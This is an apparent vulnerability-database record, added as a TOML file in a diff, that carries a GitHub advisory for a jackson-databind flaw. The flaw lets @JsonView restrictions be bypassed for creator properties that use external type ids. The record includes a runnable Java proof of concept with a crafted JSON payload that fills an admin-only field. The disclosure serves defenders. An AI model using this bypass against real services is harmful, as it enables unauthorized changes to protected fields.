@@ -1,0 +1,151 @@
+[basic]
+description = '''
+## Summary
+
+In `BeanDeserializer.deserializeUsingPropertyBasedWithExternalTypeId`, the active-view (`@JsonView`) filter was applied only to the regular bean-property branch; the creator-property branch performed no `creatorProp.visibleInView(activeView)` check. A constructor parameter annotated with both `@JsonView(RestrictedView.class)` and `@JsonTypeInfo(use=Id.NAME,
+  include=As.EXTERNAL_PROPERTY)` is populated from attacker JSON even when a more restrictive view is active.
+
+  This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and GHSA-rcqc (CVE-2026-54518) descriptions cover only the main property-based path and the unwrapped-creator path respectively; the external-type-id creator path was fixed on the 3.x line via #6004 (\"Extend #5969/#5971 fixes to ... external-type-id case in regular BeanDeserializer\", commit 7dc7a17, 2026-05-22) but
+  **the fix was never backported to 2.21 or 2.18**. Users on 2.21.4 and 2.18.8 who upgraded per the published advisories remain vulnerable to the same `@JsonView` bypass technique via a different code path.
+
+## Vulnerable Code Path
+
+File: `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`
+Method: `deserializeUsingPropertyBasedWithExternalTypeId`
+
+On 2.21.4 (and 2.18.8), the creator-property branch (around line 1125-1158) checks `creatorProp.isInjectionOnly()` and hands off to `ext.handlePropertyValue(...)` / `buffer.assignParameter(...)` without ever consulting `visibleInView(activeView)`:
+
+ ```java
+  if (creatorProp != null) {
+      // [databind#1381]: if useInput=FALSE, skip deserialization from input
+      if (creatorProp.isInjectionOnly()) { ... }
+      // NO visibleInView(activeView) CHECK HERE
+      if (!ext.handlePropertyValue(p, ctxt, propName, null)) {
+          if (buffer.assignParameter(creatorProp, ...)) { ... }
+      }
+      continue;
+  }
+```
+
+On 3.1.4, the same branch contains the additional guard (commit 7dc7a17):
+
+ ```java
+   if (creatorProp != null) {
+      // [databind#5971]: must honor active view here too
+      if ((activeView != null) && !creatorProp.visibleInView(activeView)) {
+          p.skipChildren();
+          continue;
+      }
+      ...
+  }
+```
+
+The 2.21 and 2.18 backport PRs (#6005 and #6003) only backported the main-path fixes from #5969/#5971; the external-type-id fix from #6004 was not backported. The maintainer closed #6005
+  with \"got changes merged forward, looks like it's all covered now\", but the forward-merge did not include the ExtTypeId creator branch.
+
+  Proof of Concept
+
+  Compiles and runs against jackson-databind 2.21.4:
+ 
+```java
+  import com.fasterxml.jackson.annotation.*;
+  import com.fasterxml.jackson.databind.ObjectMapper;
+
+  public class JsonViewExternalTypeIdBypass {
+      public static class PublicView {}
+      public static class AdminView extends PublicView {}
+
+      public static abstract class Asset { public String name; }
+      public static class PublicAsset extends Asset {}
+      public static class AdminAsset extends Asset { public String secret; }
+
+      public static class Container {
+          @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
+                  include = JsonTypeInfo.As.EXTERNAL_PROPERTY,
+                  property = \"kind\")
+          @JsonSubTypes({
+              @JsonSubTypes.Type(value = PublicAsset.class, name = \"pub\"),
+              @JsonSubTypes.Type(value = AdminAsset.class,  name = \"admin\")
+          })
+          @JsonView(AdminView.class)
+          public Asset asset;
+
+          public String label;
+
+          @JsonCreator
+          public Container(
+                  @JsonProperty(\"label\") String label,
+                  @JsonProperty(\"asset\") @JsonView(AdminView.class) Asset asset) {
+              this.label = label;
+              this.asset = asset;
+          }
+      }
+
+      public static class Wrapper {
+          @JsonView(PublicView.class)
+          public Container data;
+      }
+
+      public static void main(String[] args) throws Exception {
+          // Admin-only \"asset\" should be blocked when reading with PublicView
+          String json = \"{\\"data\\":{\\"label\\":\\"hello\\",\\"kind\\":\\"admin\\",\"
+                      + \"\\"asset\\":{\\"name\\":\\"foo\\",\\"secret\\":\\"LEAKED\\"}}}\";
+
+          ObjectMapper om = new ObjectMapper();
+          Wrapper r = om.readerWithView(PublicView.class)
+                  .forType(Wrapper.class)
+                  .readValue(json);
+
+          System.out.println(r.data);
+          // Actual on 2.21.4:   Container{label='hello', asset=AdminAsset{name='foo', secret='LEAKED'}}
+          // Expected (secure):  Container{label='hello', asset=null}
+          if (r.data.asset != null && r.data.asset instanceof AdminAsset) {
+              System.out.println(\"[!!] BYPASS CONFIRMED — admin-only asset populated under PublicView\");
+          }
+      }
+  }
+```
+
+A control case that removes include = As.EXTERNAL_PROPERTY (forcing the normal property-based path) correctly returns asset = null, confirming the bypass is specific to the ExternalTypeId
+  code path and not a misconfiguration.
+
+### Impact
+
+  View-restricted (e.g. admin-only) creator properties can be populated from untrusted input where @JsonView is used as a write-side authorization boundary. Typical victims are Spring Boot
+  REST controllers that use @JsonView(PublicView.class) on the request body to whitelist user-settable fields — an attacker can inject the restricted creator parameter (including choosing
+  the polymorphic subtype via the sibling kind/type-id property) by combining it with a polymorphic @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same field.
+
+- CWE-863 (Incorrect Authorization)
+- Same impact class as CVE-2026-54517 / CVE-2026-54518
+- No RCE, no DoS — this is an access-control / mass-assignment bypass
+
+### Trigger Conditions
+
+Developer code must combine (no opt-in user configuration required):
+
+1. Property-based @JsonCreator on the outer type
+2. A creator parameter annotated with @JsonView(RestrictedView.class)
+3. The same parameter annotated with @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY, property=\"...\")
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "jackson-databind: `@JsonView` bypass for creator properties with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)`"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-mhm7-754m-9p8w"]
+ave_id = "AVE-2026-1147"
+
+[meta]
+collected_at = "2026-08-06T07:29:21.299738366+00:00"
+status = "completed"
+
+[references]
+urls = []
